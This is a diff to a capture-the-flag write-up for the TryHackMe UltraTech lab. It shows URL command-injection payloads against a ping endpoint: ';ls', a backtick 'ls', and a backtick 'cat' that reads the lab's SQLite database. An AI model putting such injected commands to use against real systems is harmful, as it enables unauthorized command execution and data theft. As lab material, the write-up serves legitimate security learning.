@@ -149,7 +149,9 @@ What if we changed the request to something else? Let's see what happens when we
 http://10.10.39.165:8081/ping?ip=10.10.39.165;ls
 ```
 Hm, nothing happened. Let's try that again with backticks.<br />
-`http://10.10.39.165:8081/ping?ip=10.10.39.165;`ls``
+```shell
+http://10.10.39.165:8081/ping?ip=10.10.39.165;`ls`
+```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT13.png?raw=true)<br />
 Success! We were able to list a file "utech.db.sqlite" before we move on, let's have a look at the database file.<br />
 http://10.10.39.165:8081/ping?ip=10.10.39.165;`cat utech.db.sqlite`
